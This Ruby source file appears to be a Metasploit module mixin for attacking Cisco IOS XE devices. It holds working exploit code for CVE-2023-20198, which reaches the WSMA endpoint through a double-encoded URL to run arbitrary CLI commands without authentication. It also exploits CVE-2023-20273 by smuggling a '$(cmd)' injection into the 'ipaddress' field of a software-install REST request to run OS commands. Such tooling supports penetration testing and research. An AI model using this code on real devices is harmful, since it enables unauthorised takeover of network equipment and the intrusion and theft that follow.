module Msf
  module Exploit::Remote::HTTP::CiscoIosXe

    class Mode
      USER_EXEC = :user # User EXEC
      PRIVILEGED_EXEC = :privileged # Privileged EXEC
      GLOBAL_CONFIGURATION = :global # Global Configuration

      def self.to_mode(str)
        case str.to_sym
        when USER_EXEC
          USER_EXEC
        when PRIVILEGED_EXEC
          PRIVILEGED_EXEC
        when GLOBAL_CONFIGURATION
          GLOBAL_CONFIGURATION
        end
      end
    end

    # Leverage CVE-2023-20198 to run an arbitrary CLI command against a vulnerable Cisco IOX XE device.
    def run_cli_command(cmd, mode, username = 'vty0')

      case mode
      when Mode::USER_EXEC
        cmd = "exit\nexit\n" + cmd
      when Mode::PRIVILEGED_EXEC
        cmd = "exit\n" + cmd
      end

      # As we place the cmd in CDATA, we cannot have the closing tag in the command.
      if cmd.include? ']]>'
        print_error("CLI command contain bad sequence ']]>'.")
        return nil
      end

      xml = %(<?xml version="1.0"?>
  <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <SOAP:Header>
      <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
        <wsse:UsernameToken SOAP:mustUnderstand="false">
          <wsse:Username>#{username}</wsse:Username>
          <wsse:Password>*****</wsse:Password>
        </wsse:UsernameToken>
      </wsse:Security>
    </SOAP:Header>
    <SOAP:Body>
      <request correlator="#{Rex::Text.rand_text_alpha(8)}" xmlns="urn:cisco:wsma-config">
        <configApply details="all" action-on-fail="continue">
          <config-data>
           <cli-config-data-block><![CDATA[#{cmd}]]></cli-config-data-block>
          </config-data>
        </configApply>
      </request>
    </SOAP:Body>
  </SOAP:Envelope>)

      res = send_request_cgi(
        'method' => 'POST',
        'uri' => datastore['SSL'] == true ? '/%2577eb%2575i_%2577sma_hTtPs' : '/%2577eb%2575i_%2577sma_hTtP',
        'data' => xml
      )

      return nil unless res&.code == 200

      xml_doc = Nokogiri::XML(res.body)

      xml_doc.remove_namespaces!

      result = ''

      xml_doc.xpath('//Envelope/Body/response/resultEntry/text').each do |val1|
        result << val1.content.gsub(/^\*\*CLI Line # \d+: /, '')
      end

      result
    end

    # Leverage CVE-2023-20273 to run an arbitrary OS command against a vulnerable Cisco IOX XE device.
    def run_os_command(cmd, admin_username, admin_password)
      # https://blog.leakix.net/2023/10/cisco-root-privesc/ reports that on version 17.* 'installMethod' is now 'mode'.
      # We pass both to satisfy either version.
      json = %({
  "installMethod": "tftp",
  "mode": "tftp",
  "ipaddress": "#{Rex::Text.rand_text_hex(4)}:#{Rex::Text.rand_text_hex(4)}:#{Rex::Text.rand_text_hex(4)}:$(#{cmd})",
  "operation_type": "SMU",
  "filePath": "#{Rex::Text.rand_text_alpha(8)}",
  "fileSystem": "flash:"
})

      res = send_request_cgi(
        'method' => 'POST',
        'uri' => normalize_uri('webui', 'rest', 'softwareMgmt', 'installAdd'),
        'headers' => {
          'Authorization' => basic_auth(admin_username, admin_password)
        },
        'data' => json
      )

      res&.code == 200
    end
  end
end
